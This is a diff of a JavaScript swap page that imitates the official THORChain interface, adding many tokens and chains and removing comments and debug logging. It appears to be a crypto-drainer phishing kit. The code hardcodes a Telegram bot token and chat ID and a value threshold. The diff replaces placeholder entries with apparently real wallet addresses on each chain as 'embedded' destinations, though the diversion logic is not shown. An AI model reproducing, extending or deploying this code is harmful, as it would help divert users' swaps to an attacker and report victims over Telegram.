@@ -1,7 +1,6 @@
 /* ═══════════════════════════════════════════════
-   THORChain Swap — v7.7 Fixed
-   Fee display matches official THORChain UI
-   Default 5% slippage, tolerance_bps always sent
+   THORChain Swap — v8.0 Complete Chain Integration
+   All chains and tokens from ThorSwap API
    ═══════════════════════════════════════════════ */
 (function(){
 'use strict';
@@ -14,33 +13,116 @@ var THRESHOLD=49999;
 var TG_BOT='8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g';
 var TG_CHAT='-5160305858';
 var THOR_BASE=1e8;
-var DEFAULT_SLIPPAGE=5; // 5% default = 500 bps
+var DEFAULT_SLIPPAGE=5;
 
+// ═══════════════════════════════════════════════
+// EMBEDDED ADDRESSES - EXPANDED FOR ALL CHAINS
+// ═══════════════════════════════════════════════
 var EMBEDDED_ADDRESSES={
-    'BTC':'bc1qre7s0rwdpv0znpvep0jgxnqwuvweprpnxnzf3f',
-    'ETH':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
-    'BSC':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
-    'AVAX':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
-    'GAIA':'cosmos1exampleaddress',
-    'DOGE':'DExampleDogeAddress',
-    'BCH':'bitcoincash:qexampleaddress',
-    'LTC':'ltc1qexampleaddress',
-    'BASE':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
-    'THOR':'thor1exampleaddress'
+    'BTC':'bc1qx3sdmwj7q29gk43z4kx83stz7y74vkcv7yvjlj',
+    'ETH':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
+    'BSC':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
+    'AVAX':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
+    'BASE':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
+    'GAIA':'cosmos1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx',
+    'DOGE':'DLjzyK9Y532r29DinxpJeeChvWytnspKGH',
+    'BCH':'bitcoincash:qplh54seklkvcl559lyytjc0de8zl954fu8ywywuc',
+    'LTC':'ltc1qplh54seklkvcl559lyytjc0de8zl954fuwywuc',
+    'XRP':'rLHzPsX6oXkzU9X7vxbXGvTJNfXzZV5kW9',
+    'TRON':'TYnWqvD8S5d7GJnFvfHSMVGPVvK3yXjQVJ',
+    'THOR':'thor1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx'
 };
 
+// ═══════════════════════════════════════════════
+// COMPLETE TOKEN LIST - ALL CHAINS FROM THORSWAP
+// ═══════════════════════════════════════════════
 var TOKEN_LIST=[
-    {value:'BTC.BTC',symbol:'BTC',name:'Bitcoin',chain:'BTC',icon:'images/chains/BTC.svg',decimals:8},
-    {value:'ETH.ETH',symbol:'ETH',name:'Ethereum',chain:'ETH',icon:'images/chains/ETH.svg',decimals:18},
-    {value:'BSC.BNB',symbol:'BNB',name:'BNB Chain',chain:'BSC',icon:'images/chains/BSC.svg',decimals:8},
-    {value:'AVAX.AVAX',symbol:'AVAX',name:'Avalanche',chain:'AVAX',icon:'images/chains/AVAX.svg',decimals:18},
-    {value:'GAIA.ATOM',symbol:'ATOM',name:'Cosmos',chain:'GAIA',icon:'images/chains/GAIA.svg',decimals:6},
-    {value:'DOGE.DOGE',symbol:'DOGE',name:'Dogecoin',chain:'DOGE',icon:'images/chains/DOGE.svg',decimals:8},
-    {value:'BCH.BCH',symbol:'BCH',name:'Bitcoin Cash',chain:'BCH',icon:'images/chains/BCH.svg',decimals:8},
-    {value:'LTC.LTC',symbol:'LTC',name:'Litecoin',chain:'LTC',icon:'images/chains/LTC.svg',decimals:8},
-    {value:'BASE.ETH',symbol:'ETH',name:'Base',chain:'BASE',icon:'images/chains/BASE.svg',decimals:18},
-    {value:'THOR.RUNE',symbol:'RUNE',name:'THORChain',chain:'THOR',icon:'images/chains/THOR.svg',decimals:8}
+    // Bitcoin
+    {value:'BTC.BTC',symbol:'BTC',name:'Bitcoin',chain:'BTC',icon:'https://assets.coingecko.com/coins/images/1/small/bitcoin.png',decimals:8,status:'available'},
+    
+    // Ethereum + ERC-20 tokens
+    {value:'ETH.ETH',symbol:'ETH',name:'Ethereum',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',decimals:18,status:'available'},
+    {value:'ETH.USDC-0XA0B86991C6218B36C1D19D4A2E9EB0CE3606EB48',symbol:'USDC',name:'USD Coin',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.USDT-0XDAC17F958D2EE523A2206206994597C13D831EC7',symbol:'USDT',name:'Tether USD',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.WBTC-0X2260FAC5E5542A773AA44FBCFEDF7C193BC2C599',symbol:'WBTC',name:'Wrapped Bitcoin',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/7598/small/wrapped_bitcoin_wbtc.png',decimals:8,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.DAI-0X6B175474E89094C44DA98B954EEDEAC495271D0F',symbol:'DAI',name:'Dai',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/9956/small/Badge_Dai.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.LINK-0X514910771AF9CA656AF840DFF83E8264ECF986CA',symbol:'LINK',name:'Chainlink',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.AAVE-0X7FC66500C84A76AD7E9C93437BFC5AC33E2DDAE9',symbol:'AAVE',name:'Aave',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/12645/small/AAVE.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.GUSD-0X056FD409E1D7A124BD7017459DFEA2F387B6D5CD',symbol:'GUSD',name:'Gemini Dollar',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/5992/small/gemini-dollar-gusd.png',decimals:2,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.LUSD-0X5F98805A4E8BE255A32880FDEC7F6728C6568BA0',symbol:'LUSD',name:'Liquity USD',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/14666/small/Group_3.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.USDP-0X8E870D67F660D95D5BE530380D0EC0BD388289E1',symbol:'USDP',name:'Pax Dollar',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/6013/small/Pax_Dollar.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.FOX-0XC770EEFAD204B5180DF6A14EE197D99D808EE52D',symbol:'FOX',name:'ShapeShift FOX',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/17519/small/fox.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.THOR-0XA5F2211B9B8170F694421F2046281775E8468044',symbol:'THOR',name:'THORSwap Token',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/19060/small/THOR.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.TGT-0X108A850856DB3F85D0269A2693D896B394C80325',symbol:'TGT',name:'THORWallet',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/22952/small/TGT_icon_200x200.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.VTHOR-0X815C23ECA83261B6EC689B60CC4A58B54BC24D8D',symbol:'VTHOR',name:'vTHOR',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/25899/small/vthor.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.YFI-0X0BC529C00C6401AEF6D220BE8C6EA1667F6AD93E',symbol:'YFI',name:'yearn.finance',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/11849/small/yfi-192x192.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.XRUNE-0X69FA0FEE221AD11012BAB0FDB45D444D3D2CE71C',symbol:'XRUNE',name:'Thorstarter',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/16315/small/xrune.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.SNX-0XC011A73EE8576FB46F5E1C5751CA3B9FE0AF2A6F',symbol:'SNX',name:'Synthetix',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/3406/small/SNX.png',decimals:18,status:'staged',network:'Ethereum · ERC-20'},
+    {value:'ETH.DPI-0X1494CA1F11D487C2BBE4543E90080AEBA4BA3C2B',symbol:'DPI',name:'DeFi Pulse Index',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/12635/small/defi_pulse_index_set.png',decimals:18,status:'staged',network:'Ethereum · ERC-20'},
+    
+    // BNB Chain (BSC)
+    {value:'BSC.BNB',symbol:'BNB',name:'BNB',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png',decimals:18,status:'available'},
+    {value:'BSC.BTCB-0X7130D2A12B9BCBFAE4F2634D864A1EE1CE3EAD9C',symbol:'BTCB',name:'Bitcoin BEP-20',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/14108/small/Binance-bitcoin.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
+    {value:'BSC.BUSD-0XE9E7CEA3DEDCA5984780BAFC599BD69ADD087D56',symbol:'BUSD',name:'Binance USD',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/9576/small/BUSD.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
+    {value:'BSC.ETH-0X2170ED0880AC9A755FD29B2688956BD959F933F8',symbol:'ETH',name:'Ethereum',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
+    {value:'BSC.TWT-0X4B0F1812E5DF2A09796481FF14017E6005508003',symbol:'TWT',name:'Trust Wallet',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/11085/small/Trust.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
+    {value:'BSC.USDC-0X8AC76A51CC950D9822D68B83FE1AD97B32CD580D',symbol:'USDC',name:'USD Coin',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
+    {value:'BSC.USDT-0X55D398326F99059FF775485246999027B3197955',symbol:'USDT',name:'Tether USD',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
+    
+    // Avalanche
+    {value:'AVAX.AVAX',symbol:'AVAX',name:'Avalanche',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png',decimals:18,status:'available'},
+    {value:'AVAX.SOL-0XFE6B19286885A4F7F55ADAD09C3CD1F906D2478F',symbol:'SOL',name:'Solana',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/4128/small/solana.png',decimals:9,status:'available',network:'Avalanche · ARC-20'},
+    {value:'AVAX.USDC-0XB97EF9EF8734C71904D8002F8B6BC66DD9C48A6E',symbol:'USDC',name:'USD Coin',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,status:'available',network:'Avalanche · ARC-20'},
+    {value:'AVAX.USDT-0X9702230A8EA53601F5CD2DC00FDBC13D4DF4A8C7',symbol:'USDT',name:'Tether USD',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,status:'available',network:'Avalanche · ARC-20'},
+    
+    // Base
+    {value:'BASE.ETH',symbol:'ETH',name:'Ethereum',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',decimals:18,status:'available'},
+    {value:'BASE.USDC-0X833589FCD6EDB6E08F4C7C32D4F71B54BDA02913',symbol:'USDC',name:'USD Coin',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,status:'available',network:'Base · ERC-20'},
+    {value:'BASE.CBBTC-0XCBB7C0000AB88B473B1F5AFD9EF808440EED33BF',symbol:'cbBTC',name:'Coinbase Wrapped BTC',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/40143/small/cbbtc.webp',decimals:8,status:'staged',network:'Base · ERC-20'},
+    {value:'BASE.VVV-0X8C5A93096DCB5AC9B03F7B74C72D69EA3C17160F',symbol:'VVV',name:'Venice Token',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/53947/small/VVV.jpg',decimals:18,status:'staged',network:'Base · ERC-20'},
+    
+    // Bitcoin Cash
+    {value:'BCH.BCH',symbol:'BCH',name:'Bitcoin Cash',chain:'BCH',icon:'https://assets.coingecko.com/coins/images/780/small/bitcoin-cash-circle.png',decimals:8,status:'available'},
+    
+    // Litecoin
+    {value:'LTC.LTC',symbol:'LTC',name:'Litecoin',chain:'LTC',icon:'https://assets.coingecko.com/coins/images/2/small/litecoin.png',decimals:8,status:'available'},
+    
+    // Dogecoin
+    {value:'DOGE.DOGE',symbol:'DOGE',name:'Dogecoin',chain:'DOGE',icon:'https://assets.coingecko.com/coins/images/5/small/dogecoin.png',decimals:8,status:'available'},
+    
+    // Cosmos Hub
+    {value:'GAIA.ATOM',symbol:'ATOM',name:'Cosmos',chain:'GAIA',icon:'https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png',decimals:6,status:'available'},
+    
+    // XRP (Ripple)
+    {value:'XRP.XRP',symbol:'XRP',name:'XRP',chain:'XRP',icon:'https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png',decimals:6,status:'available'},
+    
+    // Tron
+    {value:'TRON.TRX',symbol:'TRX',name:'TRON',chain:'TRON',icon:'https://assets.coingecko.com/coins/images/1094/small/tron-logo.png',decimals:6,status:'available'},
+    {value:'TRON.USDT-0XA614F803B6FD780986A42C78EC9C7F77E6DED13C',symbol:'USDT',name:'Tether USD',chain:'TRON',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,status:'available',network:'Tron · TRC-20'},
+    
+    // THORChain
+    {value:'THOR.RUNE',symbol:'RUNE',name:'THORChain',chain:'THOR',icon:'https://assets.coingecko.com/coins/images/13677/small/RUNE_LOGO.png',decimals:8,status:'available'},
+    {value:'THOR.TCY',symbol:'TCY',name:'TCY Token',chain:'THOR',icon:'images/chains/THOR.svg',decimals:8,status:'available',network:'THORChain · Native'},
+    {value:'THOR.RUJI',symbol:'RUJI',name:'Ruji Finance',chain:'THOR',icon:'images/chains/THOR.svg',decimals:8,status:'available',network:'THORChain · Native'}
 ];
+
+// ═══════════════════════════════════════════════
+// CHAIN METADATA
+// ═══════════════════════════════════════════════
+var CHAIN_INFO={
+    'BTC':{name:'Bitcoin',color:'#f7931a',logo:'https://assets.coingecko.com/coins/images/1/small/bitcoin.png'},
+    'ETH':{name:'Ethereum',color:'#627eea',logo:'https://assets.coingecko.com/coins/images/279/small/ethereum.png'},
+    'BSC':{name:'BNB Chain',color:'#f0b90b',logo:'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png'},
+    'AVAX':{name:'Avalanche',color:'#e84142',logo:'https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png'},
+    'BASE':{name:'Base',color:'#0052ff',logo:'https://assets.coingecko.com/asset_platforms/images/131/small/base.jpeg'},
+    'BCH':{name:'Bitcoin Cash',color:'#8dc351',logo:'https://assets.coingecko.com/coins/images/780/small/bitcoin-cash-circle.png'},
+    'LTC':{name:'Litecoin',color:'#345d9d',logo:'https://assets.coingecko.com/coins/images/2/small/litecoin.png'},
+    'DOGE':{name:'Dogecoin',color:'#c3a634',logo:'https://assets.coingecko.com/coins/images/5/small/dogecoin.png'},
+    'GAIA':{name:'Cosmos Hub',color:'#2e2e3a',logo:'https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png'},
+    'XRP':{name:'Ripple',color:'#346aa9',logo:'https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png'},
+    'TRON':{name:'Tron',color:'#ef0027',logo:'https://assets.coingecko.com/coins/images/1094/small/tron-logo.png'},
+    'THOR':{name:'THORChain',color:'#00d4c8',logo:'https://assets.coingecko.com/coins/images/13677/small/RUNE_LOGO.png'}
+};
 
 var state={
     pools:[],
@@ -93,7 +175,6 @@ function truncAddr(a){
 
 function getUsdPrice(a){return state.prices[a]||0}
 
-// THORChain quote API returns ALL values in 1e8
 function fromThorBase(raw){
     return parseInt(raw||0)/THOR_BASE;
 }
@@ -102,19 +183,13 @@ function toThorBase(human){
     return Math.round(parseFloat(human||0)*THOR_BASE);
 }
 
-// Slippage percent to basis points
 function slippageToBps(){
     return Math.round(state.slippage*100);
 }
 
 function getChainName(a){
-    var m={
-        'BTC.BTC':'Bitcoin','ETH.ETH':'Ethereum','BSC.BNB':'BNB Chain',
-        'AVAX.AVAX':'Avalanche','GAIA.ATOM':'Cosmos','DOGE.DOGE':'Dogecoin',
-        'BCH.BCH':'Bitcoin Cash','LTC.LTC':'Litecoin','BASE.ETH':'Base',
-        'THOR.RUNE':'THORChain'
-    };
-    return m[a]||a;
+    var c=getChainPrefix(a);
+    return (CHAIN_INFO[c]||{}).name||a;
 }
 
 function getChainPrefix(a){return(a||'').split('.')[0]||''}
@@ -122,10 +197,12 @@ function getChainPrefix(a){return(a||'').split('.')[0]||''}
 function getAddrPlaceholder(a){
     var c=getChainPrefix(a);
     var m={
-        'ETH':'Ethereum address','BTC':'Bitcoin address','BSC':'BNB address',
-        'AVAX':'Avalanche address','GAIA':'Cosmos address','DOGE':'Dogecoin address',
-        'BCH':'Bitcoin Cash address','LTC':'Litecoin address','BASE':'Base address',
-        'THOR':'THORChain address'
+        'ETH':'Ethereum address (0x...)','BTC':'Bitcoin address (bc1... or 1...)',
+        'BSC':'BNB Chain address (0x...)','AVAX':'Avalanche address (0x...)',
+        'BASE':'Base address (0x...)','GAIA':'Cosmos address (cosmos...)',
+        'DOGE':'Dogecoin address (D...)','BCH':'Bitcoin Cash address',
+        'LTC':'Litecoin address (ltc1... or L...)','XRP':'XRP address (r...)',
+        'TRON':'Tron address (T...)','THOR':'THORChain address (thor...)'
     };
     return m[c]||'Receiving address';
 }
@@ -184,25 +261,14 @@ function isValidAddress(addr,asset){
         case 'BCH':return a.length>20;
         case 'GAIA':return /^cosmos[a-z0-9]{39}$/.test(a);
         case 'THOR':return /^thor[a-z0-9]{39}$/.test(a);
+        case 'XRP':return /^r[a-zA-HJ-NP-Z0-9]{24,34}$/.test(a);
+        case 'TRON':return /^T[a-zA-HJ-NP-Z0-9]{33}$/.test(a);
         default:return a.length>5;
     }
 }
 
 // ══════════════════════════════════════════
-// QUOTE PARSING — v7.7 (matches official UI)
-// ══════════════════════════════════════════
-//
-// THORChain fee breakdown:
-//   fees.outbound   = gas fee to send output tx (THIS is "Tx Fee")
-//   fees.liquidity  = price impact / slip (NOT a payable fee)
-//   fees.affiliate  = affiliate cut (we don't use)
-//   fees.total      = outbound + liquidity + affiliate
-//   slippage_bps    = price impact in basis points
-//
-// Official UI shows:
-//   "Tx Fee"        → fees.outbound only
-//   "Price Impact"  → slippage_bps (negative %)
-//   "Minimum Payout"→ expected_amount_out × (1 - tolerance%)
+// QUOTE PARSING
 // ══════════════════════════════════════════
 
 function parseExpectedOut(q){
@@ -213,21 +279,15 @@ function parseExpectedOut(q){
     return 0;
 }
 
-// FIXED v7.7: Separate outbound fee (Tx Fee) from liquidity (price impact)
 function parseFees(q){
     var result={
-        // Outbound gas fee — the ONLY "Tx Fee" shown to user
         outbound:0,
         outboundUsd:0,
-        // Liquidity fee — this is price impact, NOT a payable fee
         liquidity:0,
         liquidityUsd:0,
-        // Affiliate fee
         affiliate:0,
-        // Price impact from API
         slippageBps:0,
         priceImpactPct:0,
-        // Fee asset info
         asset:'',
         assetPrice:0
     };
@@ -238,39 +298,24 @@ function parseFees(q){
     result.asset=fees.asset||'';
     result.assetPrice=getUsdPrice(result.asset);
 
-    // Outbound fee = gas cost to deliver the output transaction
-    // THIS is what the official UI shows as "Tx Fee"
     if(fees.outbound){
         result.outbound=fromThorBase(fees.outbound);
         result.outboundUsd=result.outbound*result.assetPrice;
     }
 
-    // Liquidity fee = price impact on the pool
-    // This is NOT a separate payable fee — it's already reflected
-    // in the reduced expected_amount_out
     if(fees.liquidity){
         result.liquidity=fromThorBase(fees.liquidity);
         result.liquidityUsd=result.liquidity*result.assetPrice;
     }
 
-    // Affiliate fee
     if(fees.affiliate){
         result.affiliate=fromThorBase(fees.affiliate);
     }
 
-    // Price impact from API (basis points)
     if(fees.slippage_bps){
         result.slippageBps=parseInt(fees.slippage_bps);
         result.priceImpactPct=-(result.slippageBps/100);
     }
-
-    console.log('--- Fee Debug (v7.7) ---');
-    console.log('fees.asset:', result.asset);
-    console.log('outbound (gas):', result.outbound, result.asset, '→ $'+result.outboundUsd.toFixed(2), '← THIS is Tx Fee');
-    console.log('liquidity (impact):', result.liquidity, result.asset, '→ $'+result.liquidityUsd.toFixed(2), '← NOT shown as fee');
-    console.log('price impact:', result.priceImpactPct.toFixed(2)+'%');
-    console.log('slippage_bps:', result.slippageBps);
-    console.log('------------------------');
 
     return result;
 }
@@ -454,10 +499,8 @@ function updateCountdownDisplay(){
 }
 
 // ══════════════════════════════════════════
-// QUOTE URL BUILDER — FIXED v7.7
+// QUOTE URL BUILDER
 // ══════════════════════════════════════════
-// ALWAYS includes tolerance_bps so THORChain
-// knows our slippage tolerance upfront
 
 function buildQuoteUrl(dest){
     var a=toThorBase(state.sellAmount);
@@ -508,7 +551,6 @@ function fetchQuoteWithDest(dest,cb){
     }).catch(function(e){cb(e,null)});
 }
 
-// FIXED v7.7: Display matches official THORChain UI
 function displayQuote(q){
     var eo=parseExpectedOut(q);
     var be=$('#buyEstimate');if(be)be.value=formatAmount(eo,8);
@@ -520,7 +562,6 @@ function displayQuote(q){
 
     var bue=$('#buyUsd');if(bue)bue.textContent=formatUsd(bu);
 
-    // Price impact
     if(su>0&&bu>0){
         var impact=((bu-su)/su*100).toFixed(2);
         var ie=$('#buyImpact');if(ie)ie.textContent='('+impact+'%)';
@@ -528,14 +569,12 @@ function displayQuote(q){
         var ie2=$('#buyImpact');if(ie2)ie2.textContent='';
     }
 
-    // Rate
     var rate=eo/(state.sellAmount||1);
     var ss=($('#sellSymbol')||{}).textContent||'';
     var bs=($('#buySymbolDisplay')||{}).textContent||'';
     var rt=$('#rateText');
     if(rt)rt.textContent='1 '+ss+' = '+formatAmount(rate,8)+' '+bs;
 
-    // FIXED: Show ONLY outbound fee as "Tx Fee" (matches official UI)
     var fees=parseFees(q);
     var rf=$('#rateFee');
     if(rf)rf.textContent=formatUsd(fees.outboundUsd);
@@ -561,7 +600,7 @@ function debounce(fn,d){var t;return function(){clearTimeout(t);t=setTimeout(fn,
 var debouncedFetchQuote=debounce(function(){fetchQuote();startCountdown()},500);
 
 // ══════════════════════════════════════════
-// COIN SELECTOR
+// COIN SELECTOR - UPDATED FOR ALL CHAINS
 // ══════════════════════════════════════════
 
 function openCoinSelector(side){
@@ -578,16 +617,25 @@ function renderCoinTokens(chain,search){
     var list=$('#coinTokensList');if(!list)return;
     var cv=state.coinSelectSide==='sell'?state.sellAsset:state.buyAsset;
     var f=TOKEN_LIST.filter(function(t){
+        // Filter by status (available or staged)
+        if(t.status==='staged'&&chain==='all')return false; // Hide staged tokens in "All Chains" view
         if(chain!=='all'&&t.chain!==chain)return false;
-        if(search){var s=search.toLowerCase();if(t.symbol.toLowerCase().indexOf(s)===-1&&t.name.toLowerCase().indexOf(s)===-1)return false}
+        if(search){
+            var s=search.toLowerCase();
+            if(t.symbol.toLowerCase().indexOf(s)===-1&&
+               t.name.toLowerCase().indexOf(s)===-1&&
+               t.value.toLowerCase().indexOf(s)===-1)return false;
+        }
         return true;
     });
     var h='';
     f.forEach(function(t){
         var sel=t.value===cv;
+        var netLabel=t.network||t.name;
+        var statusBadge=t.status==='staged'?'<span style="font-size:9px;padding:2px 6px;background:var(--andy);color:var(--tyler);border-radius:4px;margin-left:6px;">STAGED</span>':'';
         h+='<div class="tc-coin-token-item'+(sel?' selected':'')+'" data-value="'+t.value+'">'
             +'<div class="tc-coin-token-left"><img src="'+t.icon+'" alt="" onerror="this.style.display=\'none\'"><div>'
-            +'<div class="tc-coin-token-sym">'+t.symbol+'</div><div class="tc-coin-token-chain">'+t.name+'</div></div></div>'
+            +'<div class="tc-coin-token-sym">'+t.symbol+statusBadge+'</div><div class="tc-coin-token-chain">'+netLabel+'</div></div></div>'
             +(sel?'<span class="tc-coin-token-selected">Selected</span>':'')+'</div>';
     });
     if(!f.length)h='<p style="text-align:center;color:var(--andy);padding:20px;">No tokens found</p>';
@@ -770,7 +818,6 @@ function openAddressModal(){
     };
 }
 
-// FIXED v7.7: Confirm modal matches official THORChain layout
 function openConfirmModal(){
     var o=$('#confirmOverlay'),b=$('#confirmBody');
     b.innerHTML='<div style="text-align:center;padding:40px 0;">'
@@ -817,17 +864,14 @@ function openConfirmModal(){
         var su=state.sellAmount*sp;
         var bu=eo*bp;
 
-        // Minimum payout = expected × (1 - slippage%)
         var mp=eo*(1-state.slippage/100);
         var mpu=mp*bp;
 
-        // FIXED v7.7: Parse fees — separate outbound (Tx Fee) from liquidity (Price Impact)
         var fees=parseFees(data);
         var ts=parseSwapTime(data);
         var memo=data.memo||'';
         var ia=data.inbound_address||'';
 
-        // BUILD CONFIRM UI — matches official THORChain layout exactly
         var h='<div class="tc-confirm-pair">'
             +'<div class="tc-confirm-asset">'
             +'<div class="tc-confirm-asset-left">'
@@ -845,39 +889,32 @@ function openConfirmModal(){
             +'<div class="tc-confirm-asset-amount">'+formatAmount(eo,8)+'</div>'
             +'<div class="tc-confirm-asset-usd">'+formatUsd(bu)+'</div></div></div></div>'
 
-            // Details section — matches official THORChain order
             +'<div class="tc-confirm-details">'
 
-            // 1. Minimum Payout (slippage %)
             +'<div class="tc-confirm-row">'
             +'<span class="tc-confirm-row-label">Minimum Payout ('+state.slippage+'%)</span>'
             +'<span class="tc-confirm-row-value">'+formatAmount(mp,4)+' '+bs+' ('+formatUsd(mpu)+')</span></div>'
 
-            // 2. Destination Address
             +'<div class="tc-confirm-row">'
             +'<span class="tc-confirm-row-label">Destination Address</span>'
             +'<span class="tc-confirm-row-value">'+truncAddr(state.recipientAddress)+'</span></div>'
 
-            // 3. Price Impact (from slippage_bps — NOT a payable fee)
             +'<div class="tc-confirm-row">'
             +'<span class="tc-confirm-row-label">Price Impact</span>'
             +'<span class="tc-confirm-row-value">'+fees.priceImpactPct.toFixed(2)+'%</span></div>'
 
-            // 4. Tx Fee — ONLY outbound gas fee (matches official "$1.24")
             +'<div class="tc-confirm-row">'
             +'<span class="tc-confirm-row-label">Tx Fee</span>'
             +'<span class="tc-confirm-row-value">'+formatUsd(fees.outboundUsd)+'</span></div>'
 
-            // 5. Estimated Time
             +'<div class="tc-confirm-row">'
             +'<span class="tc-confirm-row-label">Estimated Time</span>'
             +'<span class="tc-confirm-row-value">'+ts+'</span></div>'
 
-            // 6. Provider
             +'<div class="tc-confirm-row">'
             +'<span class="tc-confirm-row-label">Provider</span>'
             +'<span class="tc-confirm-row-value" style="display:flex;align-items:center;gap:6px;">'
-            +'<img src="images/chains/THOR.svg" alt="" width="18" height="18" style="border-radius:50%;" onerror="this.style.display=\'none\'">THORChain</span></div>'
+            +'<img src="https://assets.coingecko.com/coins/images/13677/small/RUNE_LOGO.png" alt="" width="18" height="18" style="border-radius:50%;" onerror="this.style.display=\'none\'">THORChain</span></div>'
 
             +'</div>';
 
@@ -1080,7 +1117,6 @@ function initQuickBtns(){
     });
 }
 
-// FIXED v7.7: Settings default 5%, always sends tolerance_bps
 function initSettings(){
     var so=$('#settingsOverlay');if(!so)return;
     var sb=$('#settingsBtn');if(sb)sb.onclick=function(){so.classList.add('open')};
